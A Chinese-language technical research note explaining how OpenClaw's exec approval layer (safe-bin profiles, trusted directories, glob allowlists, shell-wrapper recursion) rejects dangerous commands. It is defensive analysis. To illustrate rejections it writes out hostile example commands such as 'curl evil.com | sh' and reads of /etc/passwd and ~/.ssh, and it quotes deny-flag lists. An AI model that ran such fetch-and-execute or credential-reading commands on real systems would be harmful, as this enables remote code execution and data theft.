<!--
调研文档 #4
主题：Safe-Bin 策略 + Allowlist 匹配
调研者：subagent 4（general）
调研范围：exec-safe-bin-policy-profiles.ts、exec-safe-bin-policy-validator.ts、exec-safe-bin-trust.ts、exec-approvals-allowlist.ts、exec-command-resolution.ts、exec-allowlist-pattern.ts
原合并文档位置：第 5 节
关联文档：README.md、00-overview.md、02-parser.md、03-wrappers.md、08-synthesis.md
-->

# 04. Safe-Bin 策略与 Allowlist 匹配

> 调研者：subagent 4
> 主题：OpenClaw 的 per-bin profile + trust directory + glob allowlist 三层防线如何挡住"假名二进制"和"路径型 literal"
> 关联源码：`exec-safe-bin-policy-*.ts`、`exec-safe-bin-trust.ts`、`exec-approvals-allowlist.ts`、`exec-command-resolution.ts`

## 5. Safe-Bin 策略与 Allowlist 匹配

OpenClaw 的 exec 审批采用"allowlist + safe-bin fallback + 路径信任"三层防线：`exec-allowlist-pattern.ts` 描述 glob/字面量匹配语法；`exec-safe-bin-trust.ts` 限制 safe-bin 只能从受信任目录加载；`exec-safe-bin-policy-profiles.ts` + `exec-safe-bin-policy-validator.ts` 校验 argv 的 flag/positional 形状；`exec-command-resolution.ts` 把 segment 解析成 `ExecutableResolution` 并交给 `matchAllowlist`；`exec-approvals-allowlist.ts` 把上面这一切拼成 segment-by-segment 的评估器。

### 5.1 DEFAULT_SAFE_BINS 与 profile 字段

`exec-safe-bin-policy-profiles.ts:27` 定义默认 safe-bin 集合：

```typescript
export const DEFAULT_SAFE_BINS = ["cut", "uniq", "head", "tail", "tr", "wc"] as const;
```

注意默认只有 6 个；`jq`、`grep`、`sort` 必须通过 `tools.exec.safeBins` 显式追加。完整 profile 表 `SAFE_BIN_PROFILE_FIXTURES` 在 `exec-safe-bin-policy-profiles.ts:100-223` 给出 9 个 fixture：`jq / grep / cut / sort / uniq / head / tail / tr / wc`。

profile 编译产物（`exec-safe-bin-policy-profiles.ts:5-14`）结构：

```typescript
export type SafeBinProfile = {
  minPositional?: number;
  maxPositional?: number;
  allowedValueFlags?: ReadonlySet<string>;
  deniedFlags?: ReadonlySet<string>;
  knownLongFlags?: readonly string[];
  knownLongFlagsSet?: ReadonlySet<string>;
  longFlagPrefixMap?: ReadonlyMap<string, string | null>;
};
```

后三个字段是**预计算**的：`compileSafeBinProfile`（`exec-safe-bin-policy-profiles.ts:77-90`）对每个 fixture 调 `collectKnownLongFlags` 收集所有 `--xxx`，再 `buildLongFlagPrefixMap` 把每个前缀 → 完整 flag 或 `null`（多义），运行时不需要重做。

### 5.2 `jq` 与 `grep` profile 完整剖析

`jq`（`exec-safe-bin-policy-profiles.ts:101-113`）：

```typescript
jq: {
  maxPositional: 1,                 // 最多 1 个 positional（filter）
  allowedValueFlags: ["--arg", "--argjson", "--argstr"],
  deniedFlags: [
    "--argfile", "--rawfile", "--slurpfile",   // 文件输入：破坏 stdin-only
    "--from-file",
    "--library-path", "-L",                     // -L/--library-path：加载任意模块
    "-f",                                       // -f：--from-file
  ],
}
```

意图：jq 只能跑 inline filter + `--arg/--argjson/--argstr` 注入变量；任何把外部文件读进 jq 的入口（`--slurpfile /etc/passwd`）都拒。

`grep`（`exec-safe-bin-policy-profiles.ts:114-148`）：

```typescript
grep: {
  // Keep grep stdin-only: pattern must come from -e/--regexp.
  // Allowing one positional is ambiguous because -e consumes the pattern and
  // frees the positional slot for a filename.
  maxPositional: 0,
  allowedValueFlags: [
    "--regexp", "--max-count",
    "--after-context", "--before-context", "--context",
    "--devices", "--binary-files", "--exclude", "--include", "--label",
    "-e", "-m", "-A", "-B", "-C", "-D",
  ],
  deniedFlags: [
    "--file", "--exclude-from", "--dereference-recursive",
    "--directories", "--recursive",
    "-f", "-d", "-r", "-R",
  ],
}
```

注释点出了精妙之处：grep 强制 `maxPositional: 0` 而不是 1，因为允许 1 个 positional 会和 `-e PATTERN` 一起出现 → 第二个 token 究竟是 pattern 还是文件无法静态判定，攻击者可以塞 `grep -e x /etc/passwd`。所以 profile 强制 stdin-only，pattern 必须来自 `-e/--regexp`。

### 5.3 `validateSafeBinArgv` 的 GNU 缩写识别与 token 判定

入口在 `exec-safe-bin-policy-validator.ts:217-233`。先 `collectPositionalTokens`（同文件 `142-215`）逐 token 调 `parseExecArgvToken`（定义于 `exec-command-resolution.ts:468-502`）把 `--xxx=yyy`、`--xxx`、`-abc`、纯 positional、`-`、`--` 分类。

长选项处理（`exec-safe-bin-policy-validator.ts:50-96`）：

```typescript
function resolveCanonicalLongFlag(params): string | null {
  if (!params.flag.startsWith("--") || params.flag.length <= 2) return null;
  if (params.knownLongFlagsSet.has(params.flag)) return params.flag;        // 精确命中
  return params.longFlagPrefixMap.get(params.flag) ?? null;                // 前缀消歧
}
```

前缀 map 预计算在 `exec-safe-bin-policy-profiles.ts:54-75`：

```typescript
for (let length = 3; length <= flag.length; length += 1) {
  const prefix = flag.slice(0, length);
  const existing = prefixMap.get(prefix);
  if (existing === undefined) prefixMap.set(prefix, flag);
  else if (existing !== flag) prefixMap.set(prefix, null);   // 冲突 → null
}
```

所以 `--reg` 唯一命中 `--regexp`，而 `--e` 可能命中 `--exclude`、`--exclude-from`、`--regexp`、`--exclude` 等四个 → 存 `null`，运行时返回 null → 整条命令拒绝（fail-closed）。

`isSafeLiteralToken` 的三个正则（`exec-safe-bin-policy-validator.ts:10-44`）：

```typescript
function hasGlobToken(value): boolean          { return /[*?[\]]/.test(value); }
function hasShellExpansionToken(value): boolean {
  return /\$(?:[A-Za-z0-9_@*?!$#-]|\{|\(|\[)/.test(value);
}
function isPathLikeToken(value): boolean {
  if (trimmed.startsWith("./") || trimmed.startsWith("../") || trimmed.startsWith("~")) return true;
  if (trimmed.startsWith("/")) return true;
  return /^[A-Za-z]:[\\/]/.test(trimmed);
}
```

三者合在一起：safe-bin 接收的 literal 必须既不是 glob、不是 shell expansion、也不是路径。任何位置参数或 flag value 命中即 reject。

`deniedFlags` 命中后不是"跳过该 flag"，而是 `return -1`，整条 argv 校验返回 `null` → `validateSafeBinArgv` 返回 false（`exec-safe-bin-policy-validator.ts:217-225`）。这是 fail-closed 设计：profile 之外的 flag 视为未知即危险。

最后调用 `validateSafeBinSemantics`（`exec-safe-bin-policy-validator.ts:229-232`）做 bin-specific 的语义检查（如 `tr` 必须有非空 SET 等），独立于 profile 字段。

### 5.4 `isTrustedSafeBinPath` 与目录信任

`exec-safe-bin-trust.ts:209-213` 核心：

```typescript
export function isTrustedSafeBinPath(params: TrustedSafeBinPathParams): boolean {
  const trustedDirs = params.trustedDirs ?? getTrustedSafeBinDirs();
  const resolvedDir = normalizeTrustComparisonPath(path.dirname(path.resolve(params.resolvedPath)));
  return trustedDirs.has(resolvedDir);
}
```

只检查 `dirname`，不检查文件本身。默认 `DEFAULT_SAFE_BIN_TRUSTED_DIRS = ["/bin", "/usr/bin"]`（`exec-safe-bin-trust.ts:12`）—— 注释明确说 "OS-managed immutable bins only"。

为什么必须 `/bin` 或 `/usr/bin`：safe-bin profile 假设 argv 是"可信 stdin-only 二进制"的参数。如果 workspace 里放一个 `./cut`，profile 的 `cut` 校验就形同虚设——攻击者自己写一个 `cut` 把任意 flag 当 shell 命令执行。`isTrustedSafeBinPath` 用绝对路径 + dirname 比对把这种"假名二进制"挡掉。

`getTrustedSafeBinDirs`（`exec-safe-bin-trust.ts:182-207`）支持 `extraDirs`（用户通过 `tools.exec.safeBinTrustedDirs` 追加）和 `safeBins`（profile 中所有 bin）。它会**额外做一次 `realpath` 探测**：如果 `/opt/jq` 是 `/opt/some/jq` 的 symlink，自动把 symlink 真实目录加入 trusted set（`resolveTrustedSafeBinTargetDirs`，`exec-safe-bin-trust.ts:123-156`）。结果用进程级 `trustedSafeBinCache` 缓存，key 由 `dirs + bins + targetDirs` 拼成（`buildTrustedSafeBinCacheKey`，`exec-safe-bin-trust.ts:158-167`），用 `\u0001/\u0002` 分隔避免路径里有分隔符。

`listWritableExplicitTrustedSafeBinDirs`（同文件 `215-242`）扫描用户传入的 `extraDirs` 是否 group/world-writable（Linux 跳过 Windows）。它**不**参与匹配，而是用于启动时打印警告：用户把 `/tmp` 加进 trusted 目录等于放弃安全边界，所以要警告。

### 5.5 allowlist 匹配与路径/裸名区分

`exec-command-resolution.ts:383-430` 的 `matchAllowlist`：

```typescript
export function matchAllowlist(entries, resolution, argv?, platform?): ExecAllowlistEntry | null {
  if (!entries.length) return null;
  const bareWild = entries.find((e) => e.pattern?.trim() === "*" && !e.argPattern);
  if (bareWild && resolution) return bareWild;                          // ① 通配 *
  if (!resolution?.resolvedPath) return null;
  const trustPath = resolution.resolvedRealPath?.trim() || resolution.resolvedPath;

  let pathOnlyMatch: ExecAllowlistEntry | null = null;
  for (const entry of entries) {
    const pattern = entry.pattern?.trim();
    if (!pattern) continue;
    const patternMatches = hasPathSelector(pattern)
      ? matchesExecAllowlistPattern(pattern, trustPath)                 // ② path-style
      : pattern !== "*" && matchesExecutableBasenamePattern(pattern, resolution);
    if (!patternMatches) continue;
    if (!entry.argPattern) { pathOnlyMatch = entry; continue; }
    if (argv && matchArgPattern(entry.argPattern, argv, platform)) return entry;
  }
  return pathOnlyMatch;
}
```

`hasPathSelector(value)` = `value.includes("/") || value.includes("\\") || value.includes("~")`（同文件 `359-361`）。区分两类 entry：

- **path-style**（`/usr/bin/rg`、`./rg`、`~/bin/rg`）：对 `trustPath`（realpath 后的绝对路径）跑 `matchesExecAllowlistPattern`。
- **bare command-name**（`rg`、`cut`）：走 `matchesExecutableBasenamePattern`（同文件 `363-381`），关键防线是 `if (hasPathSelector(resolution.rawExecutable)) return false;` —— 用户用 `./rg` 调用时，**裸名 entry `rg` 不命中**，必须显式写路径。

这正是上一节说的"workspace 里同名 `cut` 二进制为什么不能通过"：`./cut` 的 `rawExecutable` 包含 `/` → basename matcher 直接 false → 必须有 path-style allowlist 才放行。

### 5.6 模式语法与 `\x00` 分隔

`matchesExecAllowlistPattern`（`exec-allowlist-pattern.ts:92-114`）：trim + `~` 展开 + Windows/darwin 路径规整（`/private/var` ↔ `/var`）+ 可选 realpath；然后 `compileGlobRegex`（同文件 `52-90`）按字符翻译：

```typescript
if (ch === "*") {
  const next = pattern[i + 1];
  if (next === "*") { regex += ".*"; i += 2; continue; }   // ** 跨段
  regex += "[^/]*";                                          // * 单段
}
if (ch === "?") { regex += "[^/]"; i += 1; continue; }
regex += escapeRegExpLiteral(ch);
```

裸字面量当作 exact match。pattern 含 `.` 时被 `escapeRegExpLiteral` 转义为 `\.`（`exec-allowlist-pattern.ts:48-50`），所以 `/usr/bin/rg` 字面匹配 `/usr/bin/rg` 不命中 `/usr/bin/rgx`。Windows 平台 regex 加 `i` 标志，POSIX 不加。

**`\x00` joined pattern**：用于 Windows 平台 "allow always" 自动持久化时绑定参数列表（`exec-command-resolution.ts:941-952`）：

```typescript
function buildArgPatternFromArgv(argv: string[], platform?: string | null): string | undefined {
  if (!isWindowsPlatform(platform ?? process.platform)) return undefined;
  const args = argv.slice(1);
  const normalized = args.map((a) => a.replace(/\//g, "\\"));
  if (normalized.length === 0) return "^\x00\x00$";
  const joined = normalized.join("\x00");
  return `^${escapeRegExpLiteral(joined)}\x00$`;
}
```

为什么用 `\x00` 而不是空格：argv 元素天然可以含空格（`my file.txt`），空格 join 会和 literal 空格混淆。`\x00` 在合法 argv 中不会出现，无歧义。零参数特例 `^\x00\x00$` 区分 `[]` 和 `[""]`（`matchArgPattern`，`exec-command-resolution.ts:316-323`），非零参数尾部始终带 `\x00` sentinel。匹配时通过 `argPattern.includes("\x00")` 检测风格：含则按 `\x00` 拼，否则按 legacy 空格拼（同段 `316`）。

### 5.7 `evaluateSegments` 与四种 fallback

`exec-approvals-allowlist.ts:606-662`：

```typescript
const satisfied = segments.every((segment) => {
  if (segment.resolution?.policyBlocked === true) { /* fail */ }
  const { effectiveArgv, inlineCommand, match } = resolveSegmentAllowlistMatch({...});
  if (match) matches.push(match);
  segmentAllowlistEntries.push(match ?? null);
  const by = resolveSegmentSatisfaction({
    match, segment, effectiveArgv, context, allowSkills, skillBinTrust,
  });
  const inlineResult = resolveInlineCommandFallback({ by, inlineCommand, context, inlineDepth });
  if (inlineResult) { /* push matches, mark satisfied */ return true; }
  segmentSatisfiedBy.push(by);
  return Boolean(by);
});
```

`resolveSegmentSatisfaction`（`exec-approvals-allowlist.ts:474-508`）按优先级：

1. `match` 非空 → `"allowlist"`
2. `isSafeBinUsage`（含 argv/profile 校验 + 目录信任） → `"safeBins"`
3. `isSafeBuiltinSegment`（`allowShellBuiltins` 开启）→ `"safeBuiltins"`
4. `isSkillAutoAllowedSegment`（`autoAllowSkills` 开启且 skill bin 在 trust index 中）→ `"skills"`
5. 都不命中 → `null`，该 segment 失败

`resolveInlineCommandFallback`（`exec-approvals-allowlist.ts:510-538`）：当 segment 是 shell wrapper（`sh -c "..."`、`bash -lc '...'`、`zsh -lc '...'`）但没匹配任何 allowlist/safe-bin 时，递归评估内嵌命令字符串。POSIX 分支 `splitCommandChain` 拆 `&&`/`||`/`;` 后逐 part 调 `evaluateShellWrapperInlineCommands`；Windows 分支直接调 `evaluateShellWrapperInlineCommand`。两边都先检查 backslash 行连续 (`hasShellLineContinuation`) → 命中即 null（fail-closed，因为反斜杠换行是 shell 依赖的可改写 token 边界）。**深度上限 `MAX_SHELL_WRAPPER_INLINE_EVAL_DEPTH = 3`**（`exec-approvals-allowlist.ts:238`），防止 `sh -c "sh -c 'sh -c \"...\"'"` 指数膨胀。

### 5.8 Windows 分支与三个例子

`isSafeBinUsage` 在 `exec-approvals-allowlist.ts:88-90` 显式短路：

```typescript
if (isWindowsPlatform(params.platform ?? process.platform)) {
  return false;
}
```

Windows 上 PowerShell 解析/展开规则与 POSIX 不同（`$PROFILE`、`Get-Content` 等等），safe-bin profile 不可靠 → 必须显式写 path-style allowlist。Windows 平台另一处特殊：`splitCommandChainWithOperators` 不被调用（`exec-approvals-allowlist.ts:1156-1158`），整条命令作为一个 single analysis 处理，避免 PowerShell `&&` 在 `if ($x) { ... }` 里的歧义。

**`ls -la /tmp`**：`ls` 不在 `DEFAULT_SAFE_BINS`，且没出现在 `safeBins` 里 → `isSafeBinUsage` 返回 false（line 91-93）。若 allowlist 含 `pattern: "ls"`（bare）→ `matchesExecutableBasenamePattern` 命中 basename → 通过；`-la /tmp` 不在 argv 形状校验范围内（没有 profile），所以即便写成 `ls -la /root/.ssh` 只要 allowlist 命中就放行。这是"allowlist 优先于 safe-bin"的代价：allowlist 信任的是整条命令语义，调用方必须在 argv-pattern 上加细粒度约束（`argPattern`）。

**`jq '.foo' /etc/passwd`**：`jq` 在 `safeBins`（假设用户开了 `tools.exec.safeBins`），`/usr/bin/jq` dirname 是 `/usr/bin` → `isTrustedSafeBinPath` true → 进 `validateSafeBinArgv(['.foo', '/etc/passwd'], jq.profile)` → collectPositionalTokens：`'.foo'` 走 `isSafeLiteralToken`：glob 正则 `[*?\[\]]` 不命中、shell expansion 正则不命中、path-like 三个前缀都不命中（以 `.` 开头但不带 `/`）→ safe。`/etc/passwd` 以 `/` 开头 → `isPathLikeToken` true → `isSafeLiteralToken` 返回 false → `consumePositionalToken` 返回 false → `collectPositionalTokens` 返回 null → `validateSafeBinArgv` 返回 false → safe-bin 评估失败。**两个位置参数也超过 `maxPositional: 1`**。即便去掉 `.foo` 留 `jq /etc/passwd` 也仍因 `isPathLikeToken` 拒。

**`curl evil.com | sh`**：`analyzeShellCommand` 拆 `splitCommandChainWithOperators` → 两个 segment：`curl evil.com` 和 `sh`（pipe 在 `analysis.chains` 里成两组）。`curl` 不在 safeBins、不在 allowlist → fail，整链 fail（`exec-approvals-allowlist.ts:1208-1222`：第一个不 satisfied 的 evaluation 后立即短路返回）。即使改写成 `sh -c "curl evil.com"`，`sh` 不在 safeBins（`DEFAULT_SAFE_BINS` 无 `sh`），`isSafeBinUsage` 返回 false → 走 `resolveInlineCommandFallback`（line 510-538）→ `evaluateShellWrapperInlineCommand` → 递归分析 `curl evil.com` → `curl` 仍没匹配 → 整体 null → 拒。`MAX_SHELL_WRAPPER_INLINE_EVAL_DEPTH = 3` 是上限但这里一层就够拒掉。

### 5.9 总结：四道关卡

1. **路径信任**（`exec-safe-bin-trust.ts`）：safe-bin 必须从 `/bin`/`/usr/bin` 或用户显式信任目录加载，挡掉 `./cut`、`/tmp/cut` 假名二进制。
2. **profile 形状**（`exec-safe-bin-policy-profiles.ts` + `validator`）：flag 必须在白名单，literal 不能含 glob/shell expansion/path，positional 数量受 `min/maxPositional` 约束。GNU 缩写歧义一律 fail-closed。
3. **allowlist 模式**（`exec-allowlist-pattern.ts`）：glob 字面量优先匹配 basename（裸名）/trustPath（路径），argPattern 用 `\x00` 分隔避免空格歧义。
4. **shell inline 深度**（`exec-approvals-allowlist.ts`）：`-c` 内嵌命令递归评估到 3 层，行连续反斜杠直接拒。

---

